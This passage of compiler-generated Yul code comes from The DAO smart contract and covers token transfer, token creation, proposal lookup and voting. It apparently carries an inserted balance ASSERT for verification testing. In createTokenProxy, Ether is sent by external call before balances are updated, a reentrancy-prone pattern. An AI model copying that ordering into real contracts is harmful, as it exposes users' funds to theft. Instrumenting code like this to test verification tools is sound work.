                                /// @src 0:41437:41646  "if(_toMembers) {..."
                            }
                            /// @src 0:41681:41687  "reward"
                            let _635 := var_reward_2405
                            let expr_2455 := _635
                            /// @src 0:41655:41665  "DAOpaidOut"
                            let _636_slot := 0x11
                            let expr_2451_slot := _636_slot
                            /// @src 0:41666:41676  "msg.sender"
                            let expr_2453 := caller()
                            /// @src 0:41655:41677  "DAOpaidOut[msg.sender]"
                            let _637 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2451_slot,expr_2453)
                            /// @src 0:41655:41687  "DAOpaidOut[msg.sender] += reward"
                            let _638 := read_from_storage_split_offset_0_t_uint256(_637)
                            let expr_2456 := checked_add_t_uint256(_638, expr_2455)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_637, expr_2456)
                            /// @src 0:41704:41708  "true"
                            let expr_2458 := 0x01
                            /// @src 0:41697:41708  "return true"
                            var__success_2373 := expr_2458
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1219
                        /// @src 0:30901:30992  "function receiveEther() public payable override returns (bool) {..."
                        function fun_receiveEther_1219() -> var__1214 {
                            /// @src 0:30958:30962  "bool"
                            let zero_t_bool_639 := zero_value_for_split_t_bool()
                            var__1214 := zero_t_bool_639

                            /// @src 0:30981:30985  "true"
                            let expr_1216 := 0x01
                            /// @src 0:30974:30985  "return true"
                            var__1214 := expr_1216
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 157
                        /// @src 0:3981:4350  "function transfer(address _to, uint256 _amount) public override returns (bool success) {..."
                        function fun_transfer_157(var__to_111, var__amount_113) -> var_success_117 {
                            /// @src 0:4054:4066  "bool success"
                            let zero_t_bool_640 := zero_value_for_split_t_bool()
                            var_success_117 := zero_t_bool_640

                            /// @src 0:4082:4090  "balances"
                            let _641_slot := 0x05
                            let expr_119_slot := _641_slot
                            /// @src 0:4091:4101  "msg.sender"
                            let expr_121 := caller()
                            /// @src 0:4082:4102  "balances[msg.sender]"
                            let _642 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_119_slot,expr_121)
                            let _643 := read_from_storage_split_offset_0_t_uint256(_642)
                            let expr_122 := _643
                            /// @src 0:4106:4113  "_amount"
                            let _644 := var__amount_113
                            let expr_123 := _644
                            /// @src 0:4082:4113  "balances[msg.sender] >= _amount"
                            let expr_124 := iszero(lt(cleanup_t_uint256(expr_122), cleanup_t_uint256(expr_123)))
                            /// @src 0:4082:4128  "balances[msg.sender] >= _amount && _amount > 0"
                            let expr_128 := expr_124
                            if expr_128 {
                                /// @src 0:4117:4124  "_amount"
                                let _645 := var__amount_113
                                let expr_125 := _645
                                /// @src 0:4127:4128  "0"
                                let expr_126 := 0x00
                                /// @src 0:4117:4128  "_amount > 0"
                                let expr_127 := gt(cleanup_t_uint256(expr_125), convert_t_rational_0_by_1_to_t_uint256(expr_126))
                                /// @src 0:4082:4128  "balances[msg.sender] >= _amount && _amount > 0"
                                expr_128 := expr_127
                            }
                            /// @src 0:4078:4344  "if (balances[msg.sender] >= _amount && _amount > 0) {..."
                            switch expr_128
                            case 0 {
                                /// @src 0:4328:4333  "false"
                                let expr_152 := 0x00
                                /// @src 0:4321:4333  "return false"
                                var_success_117 := expr_152
                                leave
                                /// @src 0:4078:4344  "if (balances[msg.sender] >= _amount && _amount > 0) {..."
                            }
                            default {
                                /// @src 0:4168:4175  "_amount"
                                let _646 := var__amount_113
                                let expr_133 := _646
                                /// @src 0:4144:4152  "balances"
                                let _647_slot := 0x05
                                let expr_129_slot := _647_slot
                                /// @src 0:4153:4163  "msg.sender"
                                let expr_131 := caller()
                                /// @src 0:4144:4164  "balances[msg.sender]"
                                let _648 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_129_slot,expr_131)
                                /// @src 0:4144:4175  "balances[msg.sender] -= _amount"
                                let _649 := read_from_storage_split_offset_0_t_uint256(_648)
                                let expr_134 := checked_sub_t_uint256(_649, expr_133)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_648, expr_134)
                                /// @src 0:4206:4213  "_amount"
                                let _650 := var__amount_113
                                let expr_139 := _650
                                /// @src 0:4189:4197  "balances"
                                let _651_slot := 0x05
                                let expr_136_slot := _651_slot
                                /// @src 0:4198:4201  "_to"
                                let _652 := var__to_111
                                let expr_137 := _652
                                /// @src 0:4189:4202  "balances[_to]"
                                let _653 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_136_slot,expr_137)
                                /// @src 0:4189:4213  "balances[_to] += _amount"
                                let _654 := read_from_storage_split_offset_0_t_uint256(_653)
                                let expr_140 := checked_add_t_uint256(_654, expr_139)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_653, expr_140)
                                /// @src 0:4241:4251  "msg.sender"
                                let expr_144 := caller()
                                /// @src 0:4253:4256  "_to"
                                let _655 := var__to_111
                                let expr_145 := _655
                                /// @src 0:4258:4265  "_amount"
                                let _656 := var__amount_113
                                let expr_146 := _656
                                /// @src 0:4232:4266  "Transfer(msg.sender, _to, _amount)"
                                let _657 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
                                let _658 := convert_t_address_to_t_address(expr_144)
                                let _659 := convert_t_address_to_t_address(expr_145)
                                {
                                    let _660 := allocate_unbounded()
                                    let _661 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_660 , expr_146)
                                    log3(_660, sub(_661, _660) , _657, _658, _659)
                                }/// @src 0:4287:4291  "true"
                                let expr_149 := 0x01
                                /// @src 0:4280:4291  "return true"
                                var_success_117 := expr_149
                                leave
                                /// @src 0:4078:4344  "if (balances[msg.sender] >= _amount && _amount > 0) {..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function extract_from_storage_value_offset_1_t_address(slot_value) -> value {
                            value := cleanup_from_storage_t_address(shift_right_8_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_1_t_address(slot) -> value {

                            value := extract_from_storage_value_offset_1_t_address(sload(slot))

                        }

                        function store_literal_in_memory_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb(memPtr) {

                            mstore(add(memPtr, 0), "Failed to send Ether")

                        }

                        function abi_encode_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb_to_t_string_memory_ptr_fromStack(pos) -> end {
                            pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 20)
                            store_literal_in_memory_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb(pos)
                            end := add(pos, 32)
                        }

                        function abi_encode_tuple_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb__to_t_string_memory_ptr__fromStack(headStart ) -> tail {
                            tail := add(headStart, 32)

                            mstore(add(headStart, 0), sub(tail, headStart))
                            tail := abi_encode_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb_to_t_string_memory_ptr_fromStack( tail)

                        }

                        function require_helper_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb(condition ) {
                            if iszero(condition)
                            {

                                let memPtr := allocate_unbounded()

                                mstore(memPtr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
                                let end := abi_encode_tuple_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb__to_t_string_memory_ptr__fromStack(add(memPtr, 4) )
                                revert(memPtr, sub(end, memPtr))
                            }
                        }

                        /// @ast-id 569
                        /// @src 0:11257:12065  "function createTokenProxy(address _tokenHolder) public override payable returns (bool success) {..."
                        function fun_createTokenProxy_569(var__tokenHolder_465) -> var_success_469 {

                            /// @src 0:11338:11350  "bool success"
                            let zero_t_bool_662 := zero_value_for_split_t_bool()
                            var_success_469 := zero_t_bool_662
                            
                            /// @src 0:11371:11386  "block.timestamp"
                            let expr_473 := timestamp()
                            /// @src 0:11389:11400  "closingTime"
                            let _663 := read_from_storage_split_offset_0_t_uint256(0x00)
                            let expr_474 := _663
                            /// @src 0:11371:11400  "block.timestamp < closingTime"
                            let expr_475 := lt(cleanup_t_uint256(expr_473), cleanup_t_uint256(expr_474))
                            /// @src 0:11371:11417  "block.timestamp < closingTime && msg.value > 0"
                            let expr_480 := expr_475

                            if expr_480 {
                                /// @src 0:11404:11413  "msg.value"
                                let expr_477 := callvalue()
                                /// @src 0:11416:11417  "0"
                                let expr_478 := 0x00
                                /// @src 0:11404:11417  "msg.value > 0"
                                let expr_479 := gt(cleanup_t_uint256(expr_477), convert_t_rational_0_by_1_to_t_uint256(expr_478))
                                /// @src 0:11371:11417  "block.timestamp < closingTime && msg.value > 0"
                                expr_480 := expr_479
                            }
                            /// @src 0:11371:11497  "block.timestamp < closingTime && msg.value > 0..."
                            let expr_493 := expr_480
                            if expr_493 {

                                /// @src 0:11434:11449  "privateCreation"
                                let _664 := read_from_storage_split_offset_1_t_address(0x02)
                                let expr_481 := _664
                                /// @src 0:11461:11462  "0"
                                let expr_484 := 0x00
                                /// @src 0:11453:11463  "address(0)"
                                let expr_485 := convert_t_rational_0_by_1_to_t_address(expr_484)
                                /// @src 0:11434:11463  "privateCreation == address(0)"
                                let expr_486 := eq(cleanup_t_address(expr_481), cleanup_t_address(expr_485))
                                /// @src 0:11434:11496  "privateCreation == address(0) || privateCreation == msg.sender"
                                let expr_491 := expr_486
                                if iszero(expr_491) {

                                    /// @src 0:11467:11482  "privateCreation"
                                    let _665 := read_from_storage_split_offset_1_t_address(0x02)
                                    let expr_487 := _665
                                    /// @src 0:11486:11496  "msg.sender"
                                    let expr_489 := caller()
                                    /// @src 0:11467:11496  "privateCreation == msg.sender"
                                    let expr_490 := eq(cleanup_t_address(expr_487), cleanup_t_address(expr_489))
                                    /// @src 0:11434:11496  "privateCreation == address(0) || privateCreation == msg.sender"
                                    expr_491 := expr_490
                                }
                                /// @src 0:11433:11497  "(privateCreation == address(0) || privateCreation == msg.sender)"
                                let expr_492 := expr_491
                                /// @src 0:11371:11497  "block.timestamp < closingTime && msg.value > 0..."
                                expr_493 := expr_492
                            }

                            /// @src 0:11370:11498  "(block.timestamp < closingTime && msg.value > 0..."
                            let expr_494 := expr_493
                            /// @src 0:11362:11499  "assert ((block.timestamp < closingTime && msg.value > 0..."
                            assert_helper(expr_494)


                            /// @src 0:11528:11537  "msg.value"
                            let expr_500 := callvalue()
                            /// @src 0:11540:11542  "20"
                            let expr_501 := 0x14
                            /// @src 0:11528:11542  "msg.value * 20"
                            let expr_502 := checked_mul_t_uint256(expr_500, convert_t_rational_20_by_1_to_t_uint256(expr_501))


                            /// @src 0:11527:11543  "(msg.value * 20)"
                            let expr_503 := expr_502
                            /// @src 0:11546:11555  "divisor()"

                            let expr_505 := fun_divisor_694()


                            /// @src 0:11527:11555  "(msg.value * 20) / divisor()"
                            let expr_506 := checked_div_t_uint256(expr_503, expr_505)


                            /// @src 0:11514:11555  "uint token = (msg.value * 20) / divisor()"
                            let var_token_498 := expr_506
                            /// @src 0:11593:11605  "extraBalance"
                            let _666_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                            let expr_512_address := _666_address
                            /// @src 0:11585:11606  "address(extraBalance)"
                            let expr_513 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_512_address)
                            /// @src 0:11585:11611  "address(extraBalance).call"
                            let expr_514_address := expr_513
                            /// @src 0:11619:11628  "msg.value"
                            let expr_516 := callvalue()
                            /// @src 0:11631:11636  "token"
                            let _667 := var_token_498
                            let expr_517 := _667
                            /// @src 0:11619:11636  "msg.value - token"
                            let expr_518 := checked_sub_t_uint256(expr_516, expr_517)

                            /// @src 0:11585:11637  "address(extraBalance).call{value: msg.value - token}"
                            let expr_519_address := expr_514_address
                            let expr_519_value := expr_518
                            /// @src 0:11585:11641  "address(extraBalance).call{value: msg.value - token}(\"\")"

                            let _668 := allocate_unbounded()
                            let _669 := sub(abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_668  ), _668)
                            
                            let pbal := balance(address())
                            let expr_521_component_1 := call(gas(), expr_519_address,  expr_519_value,  _668, _669, 0, 0)
                            if lt(balance(address()),pbal) {
                                ASSERT(eq(balance(address()),sub(pbal,expr_519_value)))
                            }
                            let expr_521_component_2_mpos := extract_returndata()
                            /// @src 0:11569:11641  "(bool sent, ) = address(extraBalance).call{value: msg.value - token}(\"\")"
                            let var_sent_509 := expr_521_component_1
                            /// @src 0:11663:11667  "sent"
                            let _670 := var_sent_509
                            let expr_524 := _670
                            /// @src 0:11655:11692  "require(sent, \"Failed to send Ether\")"
                            require_helper_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb(expr_524)
                            /// @src 0:11732:11737  "token"
                            let _671 := var_token_498
                            let expr_531 := _671
                            /// @src 0:11706:11714  "balances"
                            let _672_slot := 0x05
                            let expr_528_slot := _672_slot
                            /// @src 0:11715:11727  "_tokenHolder"
                            let _673 := var__tokenHolder_465
                            let expr_529 := _673
                            /// @src 0:11706:11728  "balances[_tokenHolder]"
                            let _674 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_528_slot,expr_529)

                            /// @src 0:11706:11737  "balances[_tokenHolder] += token"
                            let _675 := read_from_storage_split_offset_0_t_uint256(_674)
                            let expr_532 := checked_add_t_uint256(_675, expr_531)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_674, expr_532)
                            /// @src 0:11766:11771  "token"
                            let _676 := var_token_498
                            let expr_535 := _676
                            /// @src 0:11751:11771  "totalSupply += token"
                            let _677 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_536 := checked_add_t_uint256(_677, expr_535)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(0x07, expr_536)
                            /// @src 0:11811:11820  "msg.value"
                            let expr_542 := callvalue()
                            /// @src 0:11785:11793  "weiGiven"
                            let _678_slot := 0x04
                            let expr_538_slot := _678_slot
                            /// @src 0:11794:11806  "_tokenHolder"
                            let _679 := var__tokenHolder_465
                            let expr_539 := _679
                            /// @src 0:11785:11807  "weiGiven[_tokenHolder]"
                            let _680 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_538_slot,expr_539)
                            /// @src 0:11785:11820  "weiGiven[_tokenHolder] += msg.value"
                            let _681 := read_from_storage_split_offset_0_t_uint256(_680)
                            let expr_543 := checked_add_t_uint256(_681, expr_542)
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_680, expr_543)
                            /// @src 0:11852:11864  "_tokenHolder"
                            let _682 := var__tokenHolder_465
                            let expr_546 := _682
                            /// @src 0:11866:11871  "token"
                            let _683 := var_token_498
                            let expr_547 := _683
                            /// @src 0:11839:11872  "CreatedToken(_tokenHolder, token)"
                            let _684 := 0xdbccb92686efceafb9bb7e0394df7f58f71b954061b81afb57109bf247d3d75a
                            let _685 := convert_t_address_to_t_address(expr_546)
                            {
                                let _686 := allocate_unbounded()
                                let _687 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_686 , expr_547)
                                log2(_686, sub(_687, _686) , _684, _685)
                            }/// @src 0:11890:11901  "totalSupply"
                            let _688 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_550 := _688
                            /// @src 0:11905:11922  "minTokensToCreate"
                            let _689 := read_from_storage_split_offset_0_t_uint256(0x01)
                            let expr_551 := _689
                            /// @src 0:11890:11922  "totalSupply >= minTokensToCreate"
                            let expr_552 := iszero(lt(cleanup_t_uint256(expr_550), cleanup_t_uint256(expr_551)))
                            /// @src 0:11890:11935  "totalSupply >= minTokensToCreate && !isFueled"
                            let expr_555 := expr_552
                            if expr_555 {
                                /// @src 0:11927:11935  "isFueled"
                                let _690 := read_from_storage_split_offset_0_t_bool(0x02)
                                let expr_553 := _690
                                /// @src 0:11926:11935  "!isFueled"
                                let expr_554 := cleanup_t_bool(iszero(expr_553))
                                /// @src 0:11890:11935  "totalSupply >= minTokensToCreate && !isFueled"
                                expr_555 := expr_554
                            }
                            /// @src 0:11886:12034  "if (totalSupply >= minTokensToCreate && !isFueled) {..."
                            if expr_555 {
                                /// @src 0:11966:11970  "true"
                                let expr_557 := 0x01
                                /// @src 0:11955:11970  "isFueled = true"
                                update_storage_value_offset_0_t_bool_to_t_bool(0x02, expr_557)
                                let expr_558 := expr_557
                                /// @src 0:12007:12018  "totalSupply"
                                let _691 := read_from_storage_split_offset_0_t_uint256(0x07)
                                let expr_561 := _691
                                /// @src 0:11993:12019  "FuelingToDate(totalSupply)"
                                let _692 := 0xf381a3e2428fdda36615919e8d9c35878d9eb0cf85ac6edf575088e80e4c147e
                                {
                                    let _693 := allocate_unbounded()
                                    let _694 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_693 , expr_561)
                                    log1(_693, sub(_694, _693) , _692)
                                }/// @src 0:11886:12034  "if (totalSupply >= minTokensToCreate && !isFueled) {..."
                            }


                            /// @src 0:12054:12058  "true"
                            let expr_566 := 0x01
                            /// @src 0:12047:12058  "return true"
                            var_success_469 := expr_566
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function zero_value_for_split_t_address() -> ret {
                            ret := 0
                        }

                        /// @ast-id 2964
                        /// @src 0:46404:46570  "function getNewDAOAddress(uint _proposalID) public view override returns (address _newDAO) {..."
                        function fun_getNewDAOAddress_2964(var__proposalID_2946) -> var__newDAO_2950 {
                            /// @src 0:46478:46493  "address _newDAO"
                            let zero_t_address_695 := zero_value_for_split_t_address()
                            var__newDAO_2950 := zero_t_address_695

                            /// @src 0:46520:46529  "proposals"
                            let _696_slot := 0x08
                            let expr_2954_slot := _696_slot
                            /// @src 0:46530:46541  "_proposalID"
                            let _697 := var__proposalID_2946
                            let expr_2955 := _697
                            /// @src 0:46520:46542  "proposals[_proposalID]"

                            let _698, _699 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_2954_slot, expr_2955)
                            let _700_slot := _698
                            let expr_2956_slot := _700_slot
                            /// @src 0:46520:46552  "proposals[_proposalID].splitData"
                            let _701 := add(expr_2956_slot, 8)
                            let _702_slot := _701
                            let expr_2957_slot := _702_slot
                            /// @src 0:46553:46554  "0"
                            let expr_2958 := 0x00
                            /// @src 0:46520:46555  "proposals[_proposalID].splitData[0]"

                            let _703, _704 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2957_slot, expr_2958)
                            let _705_slot := _703
                            let expr_2959_slot := _705_slot
                            /// @src 0:46520:46562  "proposals[_proposalID].splitData[0].newDAO"
                            let _706 := add(expr_2959_slot, 3)
                            let _707_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_706)
                            let expr_2960_address := _707_address
                            /// @src 0:46512:46563  "address(proposals[_proposalID].splitData[0].newDAO)"
                            let expr_2961 := convert_t_contract$_DAO_$3021_to_t_address(expr_2960_address)
                            /// @src 0:46505:46563  "return address(proposals[_proposalID].splitData[0].newDAO)"
                            var__newDAO_2950 := expr_2961
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1057
                        /// @src 0:29561:29665  "modifier onlyTokenholders override {..."
                        function modifier_onlyTokenholders_1491(var__proposalID_1486, var__supportsProposal_1488) {
                            /// @src 0:29625:29635  "msg.sender"
                            let expr_1047 := caller()
                            /// @src 0:29615:29636  "balanceOf(msg.sender)"
                            let expr_1048 := fun_balanceOf_109(expr_1047)
                            /// @src 0:29640:29641  "0"
                            let expr_1049 := 0x00
                            /// @src 0:29615:29641  "balanceOf(msg.sender) == 0"
                            let expr_1050 := eq(cleanup_t_uint256(expr_1048), convert_t_rational_0_by_1_to_t_uint256(expr_1049))
                            /// @src 0:29614:29642  "(balanceOf(msg.sender) == 0)"
                            let expr_1051 := expr_1050
                            /// @src 0:29613:29642  "!(balanceOf(msg.sender) == 0)"
                            let expr_1052 := cleanup_t_bool(iszero(expr_1051))
                            /// @src 0:29606:29643  "assert(!(balanceOf(msg.sender) == 0))"
                            assert_helper(expr_1052)
                            /// @src 0:29657:29658  "_"
                            fun_vote_1605_inner(var__proposalID_1486, var__supportsProposal_1488)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @src 0:33322:34308  "function vote(..."
                        function fun_vote_1605_inner(var__proposalID_1486, var__supportsProposal_1488) {

                            /// @src 0:33465:33474  "proposals"
                            let _708_slot := 0x08
                            let expr_1497_slot := _708_slot
                            /// @src 0:33475:33486  "_proposalID"
                            let _709 := var__proposalID_1486
                            let expr_1498 := _709
                            /// @src 0:33465:33487  "proposals[_proposalID]"

                            let _710, _711 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1497_slot, expr_1498)
                            let _712_slot := _710
                            let expr_1499_slot := _712_slot
                            /// @src 0:33444:33487  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1496_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1499_slot)
                            /// @src 0:33507:33508  "p"
                            let _713_slot := var_p_1496_slot
                            let expr_1502_slot := _713_slot
                            /// @src 0:33507:33517  "p.votedYes"
                            let _714 := add(expr_1502_slot, 11)
                            let _715_slot := _714
                            let expr_1503_slot := _715_slot
                            /// @src 0:33518:33528  "msg.sender"
                            let expr_1505 := caller()
                            /// @src 0:33507:33529  "p.votedYes[msg.sender]"
                            let _716 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1503_slot,expr_1505)
                            let _717 := read_from_storage_split_offset_0_t_bool(_716)
                            let expr_1506 := _717
                            /// @src 0:33507:33566  "p.votedYes[msg.sender]..."
                            let expr_1512 := expr_1506
                            if iszero(expr_1512) {
                                /// @src 0:33545:33546  "p"
                                let _718_slot := var_p_1496_slot
                                let expr_1507_slot := _718_slot
                                /// @src 0:33545:33554  "p.votedNo"
                                let _719 := add(expr_1507_slot, 12)
                                let _720_slot := _719
                                let expr_1508_slot := _720_slot
                                /// @src 0:33555:33565  "msg.sender"
                                let expr_1510 := caller()
                                /// @src 0:33545:33566  "p.votedNo[msg.sender]"
                                let _721 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1508_slot,expr_1510)
                                let _722 := read_from_storage_split_offset_0_t_bool(_721)
                                let expr_1511 := _722
                                /// @src 0:33507:33566  "p.votedYes[msg.sender]..."
                                expr_1512 := expr_1511
                            }
                            /// @src 0:33507:33617  "p.votedYes[msg.sender]..."
                            let expr_1518 := expr_1512
                            if iszero(expr_1518) {
                                /// @src 0:33582:33597  "block.timestamp"
                                let expr_1514 := timestamp()
                                /// @src 0:33601:33602  "p"
                                let _723_slot := var_p_1496_slot
                                let expr_1515_slot := _723_slot
                                /// @src 0:33601:33617  "p.votingDeadline"
                                let _724 := add(expr_1515_slot, 3)
                                let _725 := read_from_storage_split_offset_0_t_uint256(_724)
                                let expr_1516 := _725
                                /// @src 0:33582:33617  "block.timestamp >= p.votingDeadline"
                                let expr_1517 := iszero(lt(cleanup_t_uint256(expr_1514), cleanup_t_uint256(expr_1516)))
                                /// @src 0:33507:33617  "p.votedYes[msg.sender]..."
                                expr_1518 := expr_1517
                            }
                            /// @src 0:33506:33618  "(p.votedYes[msg.sender]..."
                            let expr_1519 := expr_1518
                            /// @src 0:33505:33618  "!(p.votedYes[msg.sender]..."
                            let expr_1520 := cleanup_t_bool(iszero(expr_1519))
                            /// @src 0:33497:33619  "assert (!(p.votedYes[msg.sender]..."
                            assert_helper(expr_1520)
                            /// @src 0:33634:33651  "_supportsProposal"
                            let _726 := var__supportsProposal_1488
                            let expr_1523 := _726
                            /// @src 0:33630:33852  "if (_supportsProposal) {..."
                            switch expr_1523
                            case 0 {
                                /// @src 0:33779:33787  "balances"
                                let _727_slot := 0x05
                                let expr_1546_slot := _727_slot
                                /// @src 0:33788:33798  "msg.sender"
                                let expr_1548 := caller()
                                /// @src 0:33779:33799  "balances[msg.sender]"
                                let _728 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1546_slot,expr_1548)
                                let _729 := read_from_storage_split_offset_0_t_uint256(_728)
                                let expr_1549 := _729
                                /// @src 0:33770:33771  "p"
                                let _730_slot := var_p_1496_slot
                                let expr_1543_slot := _730_slot
                                /// @src 0:33770:33775  "p.nay"
                                let _731 := add(expr_1543_slot, 10)
                                /// @src 0:33770:33799  "p.nay += balances[msg.sender]"
                                let _732 := read_from_storage_split_offset_0_t_uint256(_731)
                                let expr_1550 := checked_add_t_uint256(_732, expr_1549)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_731, expr_1550)
                                /// @src 0:33837:33841  "true"
                                let expr_1558 := 0x01
                                /// @src 0:33813:33814  "p"
                                let _733_slot := var_p_1496_slot
                                let expr_1552_slot := _733_slot
                                /// @src 0:33813:33822  "p.votedNo"
                                let _734 := add(expr_1552_slot, 12)
                                let _735_slot := _734
                                let expr_1556_slot := _735_slot
                                /// @src 0:33823:33833  "msg.sender"
                                let expr_1555 := caller()
                                /// @src 0:33813:33834  "p.votedNo[msg.sender]"
                                let _736 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1556_slot,expr_1555)
                                /// @src 0:33813:33841  "p.votedNo[msg.sender] = true"
                                update_storage_value_offset_0_t_bool_to_t_bool(_736, expr_1558)
                                let expr_1559 := expr_1558
                                /// @src 0:33630:33852  "if (_supportsProposal) {..."
                            }
                            default {
                                /// @src 0:33676:33684  "balances"
                                let _737_slot := 0x05
                                let expr_1527_slot := _737_slot
                                /// @src 0:33685:33695  "msg.sender"
                                let expr_1529 := caller()
                                /// @src 0:33676:33696  "balances[msg.sender]"
                                let _738 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1527_slot,expr_1529)
                                let _739 := read_from_storage_split_offset_0_t_uint256(_738)
                                let expr_1530 := _739
                                /// @src 0:33667:33668  "p"
                                let _740_slot := var_p_1496_slot
                                let expr_1524_slot := _740_slot
                                /// @src 0:33667:33672  "p.yea"
                                let _741 := add(expr_1524_slot, 9)
                                /// @src 0:33667:33696  "p.yea += balances[msg.sender]"
                                let _742 := read_from_storage_split_offset_0_t_uint256(_741)
                                let expr_1531 := checked_add_t_uint256(_742, expr_1530)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_741, expr_1531)
                                /// @src 0:33735:33739  "true"
                                let expr_1539 := 0x01
                                /// @src 0:33710:33711  "p"
                                let _743_slot := var_p_1496_slot
                                let expr_1533_slot := _743_slot
                                /// @src 0:33710:33720  "p.votedYes"
                                let _744 := add(expr_1533_slot, 11)
                                let _745_slot := _744
                                let expr_1537_slot := _745_slot
                                /// @src 0:33721:33731  "msg.sender"
                                let expr_1536 := caller()
                                /// @src 0:33710:33732  "p.votedYes[msg.sender]"
                                let _746 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1537_slot,expr_1536)
                                /// @src 0:33710:33739  "p.votedYes[msg.sender] = true"
                                update_storage_value_offset_0_t_bool_to_t_bool(_746, expr_1539)
                                let expr_1540 := expr_1539
                                /// @src 0:33630:33852  "if (_supportsProposal) {..."
                            }
                            /// @src 0:33866:33873  "blocked"
                            let _747_slot := 0x13
                            let expr_1563_slot := _747_slot
                            /// @src 0:33874:33884  "msg.sender"
                            let expr_1565 := caller()
                            /// @src 0:33866:33885  "blocked[msg.sender]"
                            let _748 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1563_slot,expr_1565)
                            let _749 := read_from_storage_split_offset_0_t_uint256(_748)
                            let expr_1566 := _749
                            /// @src 0:33889:33890  "0"
                            let expr_1567 := 0x00
                            /// @src 0:33866:33890  "blocked[msg.sender] == 0"
                            let expr_1568 := eq(cleanup_t_uint256(expr_1566), convert_t_rational_0_by_1_to_t_uint256(expr_1567))
                            /// @src 0:33862:34237  "if (blocked[msg.sender] == 0) {..."
                            switch expr_1568
                            case 0 {
                                /// @src 0:33960:33961  "p"
                                let _750_slot := var_p_1496_slot
                                let expr_1577_slot := _750_slot
                                /// @src 0:33960:33976  "p.votingDeadline"
                                let _751 := add(expr_1577_slot, 3)
                                let _752 := read_from_storage_split_offset_0_t_uint256(_751)
                                let expr_1578 := _752
                                /// @src 0:33979:33988  "proposals"
                                let _753_slot := 0x08
                                let expr_1579_slot := _753_slot
                                /// @src 0:33989:33996  "blocked"
                                let _754_slot := 0x13
                                let expr_1580_slot := _754_slot
                                /// @src 0:33997:34007  "msg.sender"
                                let expr_1582 := caller()
                                /// @src 0:33989:34008  "blocked[msg.sender]"
                                let _755 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1580_slot,expr_1582)
                                let _756 := read_from_storage_split_offset_0_t_uint256(_755)
                                let expr_1583 := _756
                                /// @src 0:33979:34009  "proposals[blocked[msg.sender]]"

                                let _757, _758 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1579_slot, expr_1583)
                                let _759_slot := _757
                                let expr_1584_slot := _759_slot
                                /// @src 0:33979:34024  "proposals[blocked[msg.sender]].votingDeadline"
                                let _760 := add(expr_1584_slot, 3)
                                let _761 := read_from_storage_split_offset_0_t_uint256(_760)
                                let expr_1585 := _761
                                /// @src 0:33960:34024  "p.votingDeadline > proposals[blocked[msg.sender]].votingDeadline"
